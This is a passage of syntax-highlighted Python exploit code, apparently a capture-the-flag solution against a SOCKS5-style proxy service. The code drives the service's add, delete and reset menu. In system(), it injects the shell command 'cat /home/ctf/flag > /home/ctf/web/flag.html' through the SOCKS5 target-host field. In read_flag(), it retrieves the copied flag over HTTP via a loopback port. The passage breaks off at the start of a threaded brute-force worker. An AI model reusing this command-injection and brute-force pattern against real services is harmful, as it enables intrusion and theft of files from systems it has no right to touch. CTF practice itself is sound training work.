style="color:#666666">=</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD">        # info(f"_add result: {result.hex()}")</span><br><span style="color:#4D9375">        if</span><span style="color:#B8A965"> len</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">result</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> !=</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">:</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> False</span><br><span style="color:#4D9375">        return</span><span style="color:#DBD7CAEE"> result</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">00</span><br><br><span style="color:#CB7676">    def</span><span style="color:#80A665"> _delete</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">self</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> msg</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        res </span><span style="color:#666666">=</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">4</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> res </span><span style="color:#CB7676">!=</span><span style="color:#4C9A91"> 4</span><span style="color:#666666">:</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> None</span><br><span style="color:#C99076">        self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#C99076">        self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">msg</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        result </span><span style="color:#666666">=</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD">        # info(f"_delete result: {result.hex()}")</span><br><span style="color:#4D9375">        if</span><span style="color:#B8A965"> len</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">result</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> !=</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">:</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> False</span><br><span style="color:#4D9375">        return</span><span style="color:#DBD7CAEE"> result</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">00</span><br><br><span style="color:#CB7676">    def</span><span style="color:#80A665"> _sock</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">self</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> content</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        if</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">5</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> !=</span><span style="color:#4C9A91"> 5</span><span style="color:#666666">:</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> False</span><br><span style="color:#4D9375">        if</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#666666">,</span><span style="color:#BD976A"> timeout</span><span style="color:#666666">=</span><span style="color:#4C9A91">3</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> !=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\x05\x01</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> False</span><br><span style="color:#C99076">        self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">content</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        result </span><span style="color:#666666">=</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        if</span><span style="color:#B8A965"> len</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">result</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> !=</span><span style="color:#4C9A91"> 2</span><span style="color:#CB7676"> or</span><span style="color:#DBD7CAEE"> result</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> !=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">00</span><span style="color:#666666">:</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> False</span><br><br><span style="color:#DBD7CAEE">        req </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> p8</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">5</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p8</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p8</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">0</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p8</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">3</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        target_host </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">aaaaaaaa</span><span style="color:#C98A7D77">'</span><br><span style="color:#DBD7CAEE">        req </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p8</span><span style="color:#5eaab5">(</span><span style="color:#B8A965">len</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">target_host</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> target_host</span><br><span style="color:#DBD7CAEE">        req </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p16</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">80</span><span style="color:#5eaab5">)</span><br><span style="color:#C99076">        self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">req</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        response </span><span style="color:#666666">=</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">10</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        return</span><span style="color:#B8A965"> len</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">response</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> ==</span><span style="color:#4C9A91"> 10</span><span style="color:#CB7676"> and</span><span style="color:#DBD7CAEE"> response</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">0</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#4C9A91"> 5</span><br><br><span style="color:#CB7676">    def</span><span style="color:#80A665"> _reset</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">self</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        if</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">6</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> !=</span><span style="color:#4C9A91"> 6</span><span style="color:#666666">:</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> False</span><br><span style="color:#DBD7CAEE">        result </span><span style="color:#666666">=</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        if</span><span style="color:#B8A965"> len</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">result</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> !=</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">:</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> False</span><br><span style="color:#4D9375">        return</span><span style="color:#DBD7CAEE"> result</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">00</span><br><br><span style="color:#CB7676">    def</span><span style="color:#80A665"> system</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">self</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        if</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">5</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> !=</span><span style="color:#4C9A91"> 5</span><span style="color:#666666">:</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> False</span><br><span style="color:#4D9375">        if</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> !=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\x05\x01</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> False</span><br><span style="color:#C99076">        self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">a</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        result </span><span style="color:#666666">=</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        if</span><span style="color:#B8A965"> len</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">result</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> !=</span><span style="color:#4C9A91"> 2</span><span style="color:#CB7676"> or</span><span style="color:#DBD7CAEE"> result</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> !=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">00</span><span style="color:#666666">:</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> False</span><br><br><span style="color:#DBD7CAEE">        target_host </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">cat /home/ctf/flag > /home/ctf/web/flag.html</span><span style="color:#C98A7D77">'</span><br><span style="color:#DBD7CAEE">        req </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> p8</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">5</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p8</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p8</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">0</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p8</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">3</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        req </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p8</span><span style="color:#5eaab5">(</span><span style="color:#B8A965">len</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">target_host</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> target_host</span><br><span style="color:#DBD7CAEE">        req </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p16</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">80</span><span style="color:#5eaab5">)</span><br><span style="color:#C99076">        self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">req</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        response </span><span style="color:#666666">=</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">10</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        if</span><span style="color:#B8A965"> len</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">response</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> !=</span><span style="color:#4C9A91"> 10</span><span style="color:#CB7676"> or</span><span style="color:#DBD7CAEE"> response</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">0</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> !=</span><span style="color:#4C9A91"> 5</span><span style="color:#666666">:</span><span style="color:#4D9375"> return</span><span style="color:#4D9375"> False</span><br><span style="color:#4D9375">        return</span><span style="color:#DBD7CAEE"> response</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">00</span><br><br><span style="color:#CB7676">    def</span><span style="color:#80A665"> close</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">self</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        if</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">:</span><br><span style="color:#C99076">            self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">close</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">    def</span><span style="color:#80A665"> read_flag</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">self</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        if</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">choose</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">5</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> !=</span><span style="color:#4C9A91"> 5</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            return</span><span style="color:#4D9375"> False</span><br><span style="color:#DBD7CAEE">        ack </span><span style="color:#666666">=</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#666666">,</span><span style="color:#BD976A"> timeout</span><span style="color:#666666">=</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> ack </span><span style="color:#CB7676">!=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">'</span><span style="color:#C99076">\x05\x01</span><span style="color:#C98A7D77">'</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            return</span><span style="color:#4D9375"> False</span><br><span style="color:#C99076">        self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">a</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        result </span><span style="color:#666666">=</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#666666">,</span><span style="color:#BD976A"> timeout</span><span style="color:#666666">=</span><span style="color:#4C9A91">200</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        if</span><span style="color:#B8A965"> len</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">result</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> !=</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            return</span><span style="color:#4D9375"> False</span><br><span style="color:#DBD7CAEE">        status </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> result</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><br><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> status </span><span style="color:#CB7676">==</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">01</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            return</span><span style="color:#4D9375"> False</span><br><span style="color:#4D9375">        elif</span><span style="color:#DBD7CAEE"> status </span><span style="color:#CB7676">==</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">00</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            pass</span><br><span style="color:#4D9375">        else</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            return</span><span style="color:#4D9375"> False</span><br><br><span style="color:#DBD7CAEE">        target_host </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">1.0.0.127</span><span style="color:#C98A7D77">'</span><br><span style="color:#DBD7CAEE">        target_port </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 37151</span><br><br><span style="color:#DBD7CAEE">        req </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> p8</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">5</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p8</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p8</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">0</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p8</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">        ip </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> struct</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">unpack</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">!l</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> socket</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">inet_aton</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">target_host</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">0</span><span style="color:#5eaab5">]</span><br><br><span style="color:#DBD7CAEE">        req </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> p32</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">ip</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p16</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">target_port</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        pause</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#C99076">        self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">req</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        response </span><span style="color:#666666">=</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recv</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">10</span><span style="color:#666666">,</span><span style="color:#BD976A"> timeout</span><span style="color:#666666">=</span><span style="color:#4C9A91">200</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        if</span><span style="color:#B8A965"> len</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">response</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> !=</span><span style="color:#4C9A91"> 10</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            return</span><span style="color:#4D9375"> False</span><br><span style="color:#DBD7CAEE">        ver </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> response</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">0</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">        rep </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> response</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><br><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> ver </span><span style="color:#CB7676">!=</span><span style="color:#4C9A91"> 5</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            return</span><span style="color:#4D9375"> False</span><br><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> rep </span><span style="color:#CB7676">==</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">00</span><span style="color:#666666">:</span><br><span style="color:#C99076">            self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">GET /flag.html HTTP/1.1</span><span style="color:#C99076">\r\n</span><span style="color:#C98A7D">Host: localhost</span><span style="color:#C99076">\r\n\r\n</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">            data </span><span style="color:#666666">=</span><span style="color:#C99076"> self</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvall</span><span style="color:#5eaab5">(</span><span style="color:#BD976A">timeout</span><span style="color:#666666">=</span><span style="color:#4C9A91">100</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">            info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"Received data: </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">data</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">            return</span><span style="color:#4D9375"> True</span><br><span style="color:#4D9375">        else</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            return</span><span style="color:#4D9375"> False</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> add</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">content</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    try</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        pwn </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> SOCK5Pwn</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        pwn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">_add</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">content</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        pwn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">close</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    except</span><span style="color:#B8A965"> Exception</span><span style="color:#4D9375"> as</span><span style="color:#DBD7CAEE"> e</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        pass</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> delete</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">content</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    try</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        pwn </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> SOCK5Pwn</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        res </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> pwn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">_delete</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">content</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        pwn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">close</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        return</span><span style="color:#DBD7CAEE"> res</span><br><span style="color:#4D9375">    except</span><span style="color:#B8A965"> Exception</span><span style="color:#4D9375"> as</span><span style="color:#DBD7CAEE"> e</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        return</span><span style="color:#4D9375"> False</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> reset</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    try</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        pwn </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> SOCK5Pwn</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        pwn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">_reset</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        pwn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">close</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    except</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        pass</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> sock</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">content</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    try</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        pwn </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> SOCK5Pwn</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        res </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> pwn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">_sock</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">content</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        pwn</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">close</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        return</span><span style="color:#DBD7CAEE"> res</span><br><span style="color:#4D9375">    except</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        return</span><span style="color:#4D9375"> False</span><br><br><br><span style="color:#DBD7CAEE">sol </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">""</span><br><span style="color:#DBD7CAEE">sol_lock </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> threading</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">Lock</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">byte_found_event </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> threading</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">Event</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> brute_worker</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">byte_range</span><span style="color:#5eaab5">)</span><span 